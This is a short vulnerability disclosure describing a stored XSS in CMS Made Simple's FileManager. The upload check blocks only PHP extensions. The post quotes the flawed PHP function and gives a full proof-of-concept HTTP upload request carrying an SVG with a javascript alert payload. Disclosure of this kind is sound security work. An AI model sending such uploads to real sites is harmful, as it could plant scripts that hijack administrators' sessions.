ne day I felt like reviewing the source code of some random CMS and I picked CMSMS. This is totally random and I did this to kill boredom.
## FILE UPLOAD XSS  
In file manager,user can upload any files other than php。If the file ends with html, svg, it can Cause XSS.
file modules/FileManager/action.upload.php,line10~line29.  
    
    protected function is_file_acceptable( $file )
    {
      $config = \cms_config::get_instance();
      if( !$config['developer_mode'] ) {
          $ext = strtolower(substr(strrchr($file, '.'), 1));
          if( startswith($ext,'php') || endswith($ext,'php') ) return FALSE;
      }
      return TRUE;
  }
  
  It only intercepts PHP files.
  
  

### poc
   ```
   POST /admin/moduleinterface.php HTTP/1.1
   Host: 127.0.0.1
   User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:56.0) Gecko/20100101 Firefox/56.0
   Accept: application/json, text/javascript, */*; q=0.01
   Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
   X-Requested-With: XMLHttpRequest
   Referer: http://127.0.0.1/
   Content-Length: 865
   Content-Type: multipart/form-data;
   boundary=---------------------------135822859015495
   Cookie: CMSICb6b86d162b=t5qthj5ve9r557omvs3j9slkm4; CMSSESSID4df2b2a65ee6=5osblhhflr07cfmp1730ffn3n0; _sk_=98cf4d97037a4df557b; bef694b94d14a6e115ebafd2d6cd1380=LGb1BagmBwZ6VaIcMPV7nGbkB3Z6BQbvqKAypz5uoJHvB3Z6AGbvLJEgnJ4vB3Z6AGbvL2gmqJ0vB3Z6AQN6Vwp1MzLkZJD3BQAyZzD4MQt3AGIyATH4MzL1BJRlLwMzZJWyLGVjMQHvB3Z6AmbvMJMzK3IcMPV7GwgmBwRlBvWyMzMsqKAypz5uoJHvB047sD%3D%3D
   Connection: close
   -----------------------------135822859015495
   Content-Disposition: form-data; name="mact"
   FileManager,m1_,upload,0
   -----------------------------135822859015495
   Content-Disposition: form-data; name="_sk_"
   98cf4d97037a4df557b
   -----------------------------135822859015495
   Content-Disposition: form-data; name="disable_buffer"
   1
   -----------------------------135822859015495
   Content-Disposition: form-data; name="m1_files[]"; filename="svg.svg"
   Content-Type: image/png
   <svg id="rectangle"
   xmlns="http://www.w3.org/2000/svg"
   xmlns:xlink="http://www.w3.org/1999/xlink"
   width="100" height="100">
   <foreignObject width="100" height="50"
   requiredExtensions="http://www.w3.org/1999/xhtml">
   <embed xmlns="http://www.w3.org/1999/xhtml" 
   src="javascript:alert('xss')" />
   </foreignObject>
   </svg>
   -----------------------------135822859015495--
   ```

![](http://ohsqlm7gj.bkt.clouddn.com/17-11-12/40567149.jpg)

    
